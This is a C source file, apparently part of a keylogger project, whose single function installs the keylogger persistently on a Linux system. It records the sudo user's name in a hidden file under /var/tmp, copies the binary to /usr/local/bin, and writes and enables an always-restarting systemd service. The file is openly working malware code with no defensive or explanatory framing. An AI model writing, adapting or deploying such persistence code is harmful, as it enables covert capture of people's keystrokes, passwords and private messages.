#include "persistent.h"

void persistent(void)
{
    if (access("/usr/local/bin/keylogger", F_OK) == 0) {
        return;
    }

    const char *currentUser = getenv("SUDO_USER");
    const char *note_path = "/var/tmp/.keylogger_note";
    FILE *note_file = fopen(note_path, "w");
    if (note_file) {
        fprintf(note_file, "%s", currentUser);
        fclose(note_file);
    }

    system("cp ./main /usr/local/bin/keylogger");

    const char *service_path = "/etc/systemd/system/keylogger.service";

    FILE *f = fopen(service_path, "w");
    if(!f)
    {
        perror("Failed to create service file");
        return;
    }
    
    fprintf(f,
        "[Unit]\n"
        "Description=Key Logger Program\n"
        "After=graphical.target\n"
        "Wants=graphical.target\n\n"
        "[Service]\n"
        "ExecStart=/usr/local/bin/keylogger\n"
        "Restart=always\n"
        "RestartSec=10\n\n"
        "[Install]\n"
        "WantedBy=graphical.target\n"
    );
    fclose(f);

    system("systemctl daemon-reload");
    system("systemctl enable keylogger.service");
}